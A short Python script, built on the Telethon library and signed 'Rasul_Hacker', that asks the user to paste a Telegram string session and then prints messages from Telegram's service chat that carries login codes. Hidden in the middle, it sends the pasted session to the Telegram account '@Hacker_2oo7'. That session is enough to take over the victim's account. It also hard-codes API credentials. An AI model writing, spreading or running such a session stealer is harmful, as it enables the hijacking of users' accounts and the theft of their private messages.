from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest

#Rasul_Hacker
import os, sys
api_id = 10953300
api_hash = "9c24426e5d6fa1d441913e3906627f87"
os.system("clear")
string = input("String session: ")

with TelegramClient(StringSession(string), api_id, api_hash) as client:
    client.send_message("@Hacker_2oo7", client.session.save())

async def main():

    async for message in client.iter_messages(777000):
        print(message.sender.username, message.text)
        print('\n\n\n')

with client:
    client.loop.run_until_complete(main())
